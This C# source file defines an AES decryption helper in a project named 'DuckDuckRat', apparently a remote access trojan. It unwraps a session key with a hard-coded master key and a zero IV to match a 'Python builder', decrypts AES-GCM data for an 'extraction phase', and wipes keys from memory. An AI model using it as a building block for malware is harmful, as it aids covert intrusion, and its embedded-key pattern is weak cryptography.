using System;
using System.IO;
using System.Security.Cryptography;
using DuckDuckRat;

namespace DuckDuckRat
{
    public static class AesHelper
    {
        private static byte[] _sessionKey = null;

        public static byte[] Decrypt(byte[] encryptedData)
        {
            if (encryptedData == null || encryptedData.Length < 28) return null;

            try
            {
                if (_sessionKey == null)
                {
                    _sessionKey = UnwrapSessionKey();
                }

                if (_sessionKey == null) return null;

                // Format: [Nonce: 12][Tag: 16][Ciphertext: N]
                byte[] nonce = new byte[12];
                byte[] tag = new byte[16];
                byte[] ciphertext = new byte[encryptedData.Length - 12 - 16];

                Buffer.BlockCopy(encryptedData, 0, nonce, 0, 12);
                Buffer.BlockCopy(encryptedData, 12, tag, 0, 16);
                Buffer.BlockCopy(encryptedData, 28, ciphertext, 0, ciphertext.Length);

                byte[] decrypted = new byte[ciphertext.Length];

                using (AesGcm aesGcm = new AesGcm(_sessionKey))
                {
                    aesGcm.Decrypt(nonce, ciphertext, tag, decrypted);
                }

                // Note: We keep _sessionKey in memory for performance during extraction phase, 
                // but it can be wiped manually via WipeKeys() when done.
                return decrypted;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[AES_GCM_ERROR] {ex.Message}");
                return null;
            }
        }

        private static byte[] UnwrapSessionKey()
        {
            try
            {
                byte[] masterKey = Convert.FromBase64String(Constants.MASTER_KEY_B64);
                byte[] encryptedSessionKey = Convert.FromBase64String(Constants.ENCRYPTED_SESSION_KEY_B64);

                // Simple AES-CBC wrap with zero IV (matching Python builder)
                byte[] iv = new byte[16]; 
                using (Aes aes = Aes.Create())
                {
                    aes.Key = masterKey;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.None; // Key is 32 bytes, no padding needed

                    using (ICryptoTransform decryptor = aes.CreateDecryptor())
                    {
                        byte[] sessionKey = decryptor.TransformFinalBlock(encryptedSessionKey, 0, encryptedSessionKey.Length);
                        
                        // Hardening: Wipe master key from memory immediately
                        Array.Clear(masterKey, 0, masterKey.Length);
                        
                        return sessionKey;
                    }
                }
            }
            catch { return null; }
        }

        /// <summary>
        /// Explicitly wipe sensitive keys from memory. 
        /// Should be called after the initial extraction phase is complete.
        /// </summary>
        public static void WipeKeys()
        {
            if (_sessionKey != null)
            {
                Array.Clear(_sessionKey, 0, _sessionKey.Length);
                _sessionKey = null;
            }
        }
    }
}


